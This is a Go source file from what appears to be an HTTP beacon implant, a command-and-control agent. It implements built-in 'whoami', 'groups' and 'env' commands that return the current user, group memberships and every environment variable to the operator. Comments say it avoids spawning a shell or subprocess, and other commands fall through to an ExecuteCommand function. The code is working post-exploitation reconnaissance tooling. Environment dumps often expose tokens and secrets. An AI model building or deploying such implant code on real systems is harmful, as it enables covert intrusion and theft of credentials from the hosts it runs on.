package httpclient

import (
	"errors"
	"fmt"
	"os"
	"os/user"
	"sort"
	"strings"
)

// Built-in HTTP beacon commands (matched case-insensitively, whole string after trim — no extra args).
// These never use exec.Command or a shell: they use os/user and os.Environ() only (same idea as
// `whoami` / `groups` / `env` on Unix, or listing process environment on Windows — not subprocesses).

func builtinWhoami() (string, error) {
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("whoami: %w", err)
	}
	name := strings.TrimSpace(u.Username)
	if name == "" {
		return "", errors.New("whoami: empty username")
	}
	return name + "\n", nil
}

// builtinGroups lists group names for the current user via os/user (GroupIds + LookupGroupId).
func builtinGroups() (string, error) {
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("groups: %w", err)
	}
	gids, err := u.GroupIds()
	if err != nil {
		return "", fmt.Errorf("groups: %w", err)
	}
	names := make([]string, 0, len(gids))
	for _, gid := range gids {
		g, err := user.LookupGroupId(gid)
		if err != nil {
			names = append(names, gid)
			continue
		}
		if n := strings.TrimSpace(g.Name); n != "" {
			names = append(names, n)
		}
	}
	sort.Strings(names)
	return strings.Join(names, " ") + "\n", nil
}

// builtinEnvironment returns all environment variables as KEY=value lines (sorted), like `env` on Linux/macOS.
func builtinEnvironment() (string, error) {
	env := os.Environ()
	sort.Strings(env)
	return strings.Join(env, "\n") + "\n", nil
}

func normalizeBuiltinCommand(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "\ufeff") // BOM from some JSON producers
	return s
}

// runBuiltinHTTPCommand runs a built-in command when the token matches. If handled is false, use ExecuteCommand.
func runBuiltinHTTPCommand(command string) (output string, err error, handled bool) {
	s := normalizeBuiltinCommand(command)
	if s == "" {
		return "", nil, false
	}
	// Single-token only: do not treat "env -0" as builtin.
	if len(strings.Fields(s)) != 1 {
		return "", nil, false
	}
	switch strings.ToLower(s) {
	case "whoami":
		out, e := builtinWhoami()
		return out, e, true
	case "groups":
		out, e := builtinGroups()
		return out, e, true
	case "environment", "env":
		out, e := builtinEnvironment()
		return out, e, true
	default:
		return "", nil, false
	}
}
